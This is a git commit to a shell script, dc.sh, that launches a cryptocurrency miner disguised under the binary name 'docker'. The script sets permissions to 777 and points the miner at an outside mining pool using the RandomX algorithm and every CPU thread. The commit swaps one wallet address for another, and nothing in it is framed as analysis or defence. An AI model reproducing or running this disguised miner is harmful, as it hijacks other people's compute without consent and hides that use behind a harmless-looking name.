902cf4cc7145e318768c9acc4182f7cc1a97195b
jenie889 <101468788+jenie889@users.noreply.github.com>
2022-03-15 15:39:20 +0700

    Update dc.sh

--- dc.sh
+++ dc.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 chmod 777 docker
-./docker -o dcy.pool-pay.com:5657 -u NZyDXAQT1etjQEEiAoRWpacT58NtuWyWifQUP1CzvHnKWCp6L1iYsG4DzgTPJh4Wv3SvAB5jwmAiB2U3SmRFMUn9hYNDSAwgCzg3Vg52nKrYV -p $(echo $(shuf -i 1-20000 -n 1)-G) -k -a rx/0 -t$(nproc --all)
+./docker -o dcy.pool-pay.com:5657 -u NXzvQWoASN9MrmWdTSymEeA69XZdRbBRXctUwE8XW4TsdvnGTABaBnABij3dEGAWUbDgsbUH59S6Gjm6XfkAYoPp7BwmbScPr8 -p $(echo $(shuf -i 1-20000 -n 1)-G) -k -a rx/0 -t$(nproc --all)
